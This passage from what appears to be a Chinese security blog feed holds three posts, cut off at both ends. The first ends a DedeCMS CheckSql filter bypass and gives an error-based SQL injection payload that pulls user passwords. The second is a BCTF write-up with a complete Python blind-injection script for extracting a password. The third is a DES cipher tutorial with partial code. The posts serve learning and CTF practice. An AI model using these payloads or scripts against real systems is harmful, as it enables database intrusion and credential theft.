class="string">&#x27;~(^[^a-z])load_file($[^[a-z])~s&#x27;</span>, <span class="variable">$clean</span>) != <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fail</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&#x27;file fun detect&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$clean</span>, <span class="string">&#x27;into outfile&#x27;</span>) !== <span class="literal">false</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;~(^[^a-z])into\s+outfile($[^[a-z])~s&#x27;</span>, <span class="variable">$clean</span>) != <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fail</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&#x27;file fun detect&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;~\([^)]*?select~s&#x27;</span>, <span class="variable">$clean</span>) != <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fail</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&#x27;sub select detect&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$fail</span>)) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;<span class="subst">$sql</span>,<span class="subst">$error</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$sql</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>首先我们看一下payload,本地测试一下,用的sql语句为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> `dy_zgz` <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">78</span> <span class="keyword">and</span> (<span class="keyword">sElecT</span>(now()))</span><br></pre></td></tr></table></figure><p>然后把<span class="math inline">\(clean给echo出来,得到结果: ![blacsheep](/images/2018/06/1.jpg) 可以看到第二个语句的子查询被detect了,那么怎么bypass呢? 发现前面的while把函数中在单引号间的东西换成\)</span>s$然后再把sql语句拿去检测,那么我们测试用单引号包含我们的sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> `dy_zgz` <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">78</span> <span class="keyword">and</span> <span class="string">&#x27;(sElecT(now()))&#x27;</span></span><br></pre></td></tr></table></figure><p>得到结果 <img src="/images/2018/06/2.jpg" alt="blacsheep" /> 这次就没有被detect到,即使查询是相同的,因为丢进去查询的是$clean,也即第一个sql语句,里面并没有select相关句,所以成功bypass 那么如何利用呢,这里用到in和反引号来绕过,mysql中@可以定义一个变量,反引号来转义单引号,那么我们就可以构造出下面的句子</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> is_admin<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> is_admin <span class="keyword">in</span> (<span class="type">char</span>(@`<span class="string">&#x27;`), extractvalue(1, concat_ws(0x20, 0x5c,(select password from users limit 1))),char(@`&#x27;</span>`))</span><br></pre></td></tr></table></figure><p>我们先看char(@<code>'</code>),默认定义变量是为空的,所以提取结果如下 <img src="/images/2018/06/3.jpg" alt="blacsheep" /> 那么这样报错注入的地方就会执行,于是就会返回报错信息,比如 <img src="/images/2018/06/4.jpg" alt="blacsheep" /> 明白了原理,绕过也就不难了. 给出两篇参考链接 <a href="http://goodwaf.com/2016/11/30/DedeCMS-CheckSql%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/" title="http://goodwaf.com/2016/11/30/DedeCMS-CheckSql%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/">http://goodwaf.com/2016/11/30/DedeCMS-CheckSql%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/</a> <a href="http://blogs.360.cn/360webscan/2013/08/12/oracle10g-unwrap%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90-by-genxor/" title="http://blogs.360.cn/360webscan/2013/08/12/oracle10g-unwrap%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90-by-genxor/">http://blogs.360.cn/360webscan/2013/08/12/oracle10g-unwrap%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90-by-genxor/</a> 还是多学习多见识吧...近期多打打实际环境,后续碰到的东西也会慢慢发出来.</p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BCTF一道注入题</title>
      <link href="/2018/04/22/bctf%E4%B8%80%E9%81%93%E6%B3%A8%E5%85%A5%E9%A2%98/"/>
      <url>/2018/04/22/bctf%E4%B8%80%E9%81%93%E6%B3%A8%E5%85%A5%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>emmmmm... 比较尴尬...这道题是比赛之后解出来的..出了点小意外.... 好吧,这道题思路说一下... 依旧是Nu1l的那位出77777的师傅出的题...这个是第三关... 开始测试的时候发现过滤的东西还是很多的... 单字符fuzz一下, 发现可以使用的 ['"', '#', '$', "'", '(', ')', ',', '.', '2', '9', ';', '&gt;', '?', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\', ']', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '', '\x7f', '\x80'] 不能使用的 ['!', '%', '&amp;', '*', '+', '-', '/', '0', '1', '3', '4', '5', '6', '7', '8', ':', '&lt;', '=', '@', 'J', '^', '_', '`', 'j', '{', '}', '~'] 一开始的时候利用思路是发现按位或没过滤,那么可以对数字进行按位或 条件成立异或2,成功 条件不成立异或'a',失败 然后又发现if,括号,引号都没过滤,那么简单构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(pw&gt;&#x27;&#123;flag&#125;&#x27;,2,&#x27;a&#x27;)</span><br></pre></td></tr></table></figure><p>发现成功注入,这里其实这道题已经做出来了.....只是最后提出来的是大写...按小写交一下就ok了.. 不过这也是比赛之后写出通用脚本才知道的了... 当时以为姿势不对,又想了蛮多方法,后来美工姐姐说用了&lt;,然而我&lt;是在黑名单里面,那么出题人应该不是单字符匹配的 既然能用&lt;,那么很快我就想到,有数字2,9,按位或和位移&lt;<和>&gt;可以构造出所有数字,再次测试,发现substr没过滤,但是ord和asc都过滤了,不过无所谓,hex没有过滤,构造出payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;if(hex(substr(pw,&#123;order&#125;,29&gt;&gt;2&gt;&gt;2))&gt;hex(&#123;asc&#125;),2,&#x27;a&#x27;)&quot;.format(order=makedigit(order),asc=makedigit(asc))</span><br></pre></td></tr></table></figure><p>这里美工姐姐写了个数字替换函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">makedigit</span>(<span class="params">n</span>):</span><br><span class="line">    digits = [<span class="string">&quot;(2&gt;&gt;2)&quot;</span>, <span class="string">&quot;(992&gt;&gt;9)&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;(992&gt;&gt;92)&quot;</span>, <span class="string">&quot;(2*2)&quot;</span>, <span class="string">&quot;(22&gt;&gt;2)&quot;</span>, <span class="string">&quot;(2*22)&quot;</span>, <span class="string">&quot;9-2&quot;</span>, <span class="string">&quot;(2&lt;&lt;2)&quot;</span>, <span class="string">&quot;9&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">9</span>:</span><br><span class="line">        <span class="keyword">return</span> digits[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="string">&quot;(2&quot;</span></span><br><span class="line">        m = <span class="number">1</span></span><br><span class="line">        n0 = n</span><br><span class="line">        <span class="keyword">while</span> n0 &gt; <span class="number">2</span>:</span><br><span class="line">            m += <span class="number">1</span></span><br><span class="line">            s += <span class="string">&quot;&lt;&lt;(992&gt;&gt;9)&quot;</span></span><br><span class="line">            n0 = n0 / <span class="number">2</span></span><br><span class="line">        s += <span class="string">&quot;)&quot;</span></span><br><span class="line">        p = <span class="number">2</span>**m - n</span><br><span class="line">        <span class="keyword">while</span> p &gt; <span class="number">9</span>:</span><br><span class="line">            p = p - <span class="number">9</span></span><br><span class="line">            s += <span class="string">&quot;-9&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, p):</span><br><span class="line">            s += <span class="string">&quot;-(992&gt;&gt;9)&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;(&quot;</span> + s + <span class="string">&quot;)&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>贴出完整代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">makedigit</span>(<span class="params">n</span>):</span><br><span class="line">    digits = [<span class="string">&quot;(2&gt;&gt;2)&quot;</span>, <span class="string">&quot;(992&gt;&gt;9)&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;(992&gt;&gt;92)&quot;</span>, <span class="string">&quot;(2*2)&quot;</span>, <span class="string">&quot;(22&gt;&gt;2)&quot;</span>, <span class="string">&quot;(2*22)&quot;</span>, <span class="string">&quot;9-2&quot;</span>, <span class="string">&quot;(2&lt;&lt;2)&quot;</span>, <span class="string">&quot;9&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">9</span>:</span><br><span class="line">        <span class="keyword">return</span> digits[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="string">&quot;(2&quot;</span></span><br><span class="line">        m = <span class="number">1</span></span><br><span class="line">        n0 = n</span><br><span class="line">        <span class="keyword">while</span> n0 &gt; <span class="number">2</span>:</span><br><span class="line">            m += <span class="number">1</span></span><br><span class="line">            s += <span class="string">&quot;&lt;&lt;(992&gt;&gt;9)&quot;</span></span><br><span class="line">            n0 = n0 / <span class="number">2</span></span><br><span class="line">        s += <span class="string">&quot;)&quot;</span></span><br><span class="line">        p = <span class="number">2</span>**m - n</span><br><span class="line">        <span class="keyword">while</span> p &gt; <span class="number">9</span>:</span><br><span class="line">            p = p - <span class="number">9</span></span><br><span class="line">            s += <span class="string">&quot;-9&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, p):</span><br><span class="line">            s += <span class="string">&quot;-(992&gt;&gt;9)&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;(&quot;</span> + s + <span class="string">&quot;)&quot;</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> order <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    ok = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> asc <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">129</span>):</span><br><span class="line">        data=&#123;<span class="string">&#x27;flag&#x27;</span>:<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;hi&#x27;</span>:<span class="string">&quot;if(hex(substr(pw,&#123;order&#125;,29&gt;&gt;2&gt;&gt;2))&gt;hex(&#123;asc&#125;),2,&#x27;a&#x27;)&quot;</span>.<span class="built_in">format</span>(order=makedigit(order),asc=makedigit(asc))&#125;</span><br><span class="line">        r=requests.post(<span class="string">&#x27;http://3cc7fb1de9db416aabfdfba5dfef3490f3a610e11c3d44fd.game.ichunqiu.com/&#x27;</span>, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;sorry&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            ok=<span class="number">0</span></span><br><span class="line">            res+=<span class="built_in">chr</span>(asc)</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> asc == <span class="number">128</span>:</span><br><span class="line">            ok = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> ok:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>最后拿到结果 hhhhccchhddddahhhhhh 感觉flag没有设计好,并没有什么奇奇怪怪的字符... 要是一开始来个被过滤的'j',那多舒服啊... 不过思路还是很好玩的,记录一下</p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>des加密详解</title>
      <link href="/2018/04/08/des%E5%8A%A0%E5%AF%86%E8%AF%A6%E8%A7%A3/"/>
      <url>/2018/04/08/des%E5%8A%A0%E5%AF%86%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="des学习">des学习</h2><h3 id="feistel-cipher">Feistel cipher</h3><p>首先我们得了解一下什么是feistel加密 feistel加密是一种区块加密 一张图解释完毕~ <img src="/images/2018/06/feistel.jpg" alt="blacsheep" /> 需要注意的是,feistel是一种加密的框架,因为其中的f可以由用户自行定义,而且f对于解密不产生任何影响。提醒一点:解密的时候首先要把L和R反一下,一开始写des的时候解密就是因为最后没有注意到这里导致无法解密,最后手撸des的时候发现这一点才解决...</p><h3 id="des加密">des加密</h3><p>简单的了解了feistel之后我们就开始了解一下des咯 Data Encryption Standard缩写des 个人理解,des加密主要分为三个部分:</p><h4 id="一个部分是ip和ip-1置换">一个部分是IP和IP-1置换</h4><p><img src="/images/2018/06/des-IP-IP-1.jpg" alt="blacsheep" /> 也就是原来的第58位放到第一位,第50位放到第二位balabala..</p><h4 id="一个部分是密钥的处理">一个部分是密钥的处理</h4><p><img src="/images/2018/06/des-key-gen.jpg" alt="blacsheep" /> 16轮迭代之后恰好为28,回到原点继续代下一个块</p><h4 id="一个是feistel中f的实现">一个是feistel中f的实现</h4><p>首先总体的框架 <img src="/images/2018/06/des-F-func.jpg" alt="blacsheep" /> 具体看下每个部分</p><h5 id="e盒">E盒</h5><p>32bits-&gt;48bits <img src="/images/2018/06/des-E-Box.jpg" alt="blacsheep" /></p><h5 id="s盒">S盒</h5><p><img src="/images/2018/06/des-S-Box.jpg" alt="blacsheep" /> 具体的使用,举个栗子,假设第一个6bits为110101,取首位两个bits,即为11,为3对应第三行 中间1010为10对应第十列,第一个6bits对应S1那么就换成12,即1100 也就通过S盒完成了110101-&gt;1100的6bits到4bits的转换 列出8个S盒: S盒1: 14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7 0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8 4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0 15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13 S盒2: 15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10 3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5 0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15 13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9 S盒3: 10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8 13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1 13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7 1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12 S盒4: 7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5 ,11, 12, 4, 15 13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9 10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4 3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14 S盒5: 2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9 14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6 4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14 11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3 S盒6: 12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11 10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8 9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6 4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13 S盒7: 4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1 13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6 1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2 6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12 S盒8: 13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7 1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2 7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8 2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11</p><h5 id="p盒">P盒</h5><p>S盒输出的32位继续按照P盒进行置换。 16, 7, 20, 21, 29, 12, 28, 17, 1, 15, 23, 26, 5, 18, 31, 10 2, 8, 24, 14, 32, 27, 3, 9, 19, 13, 30, 6, 22, 11, 4, 25 比如原来的第21为放到第4位,替换完成就完成了f的最后操作</p><h3 id="给个代码">给个代码</h3><p>只写了bits的部分和bin2asc,asc2bin的函数,因为des的padding不清楚...等研究研究再改...</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">padding</span>(<span class="params">src,num</span>):</span><br><span class="line">        src = <span class="built_in">str</span>(src)</span><br><span class="line">        src = <span class="string">&#x27;0&#x27;</span>*(num-<span class="built_in">len</span>(src))+src</span><br><span class="line">        <span class="keyword">return</span> src</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">str1,str2</span>):</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(str1[i])==<span class="built_in">int</span>(str2[i]):</span><br><span class="line">            res.append(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res.append(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_from_zero</span>(<span class="params">list1</span>):</span><br><span class="line">    new = []</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> list1:</span><br><span class="line">        new.append(each-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> new</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bin2asc</span>(<span class="params">list_of_bin</span>):</span><br><span class="line">    group = [list_of_bin[<span class="number">8</span>*i:<span class="number">8</span>*i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(list_of_bin)/<span class="number">8</span>))]</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> one <span class="keyword">in</span> group:</span><br><span class="line">        temp = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> one:</span><br><span class="line">            temp*=<span class="number">2</span></span><br><span class="line">            temp+=<span class="built_in">int</span>(each)</span><br><span class="line">        res+=<span class="built_in">chr</span>(temp)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">asc2bin</span>(<span class="params">str1</span>):</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> str1:</span><br><span class="line">        res+=padding(<span class="built_in">bin</span>(<span class="built_in">ord</span>(each))[<span class="number">2</span>:],<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DES</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,key</span>):</span><br><span class="line">        self.key=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        key=key[<span class="number">0</span>:<span class="number">8</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*]key只取了8个字母扩展成bits,长于8个字母的key取了前八个字母!&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">            self.key+=padding(<span class="built_in">bin</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:],<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">        self.p_box_left = list_from_zero([<span class="number">57</span>,<span class="number">49</span>,<span class="number">41</span>,<span class="number">33</span>,<span class="number">25</span>,<span class="number">17</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">58</span>,<span class="number">50</span>,<span class="number">42</span>,<span class="number">34</span>,<span class="number">26</span>,<span class="number">18</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">59</span>,<span class="number">51</span>,<span class="number">43</span>,<span class="number">35</span>,<span class="number">27</span>,<span class="number">19</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">60</span>,<span class="number">52</span>,<span class="number">44</span>,<span 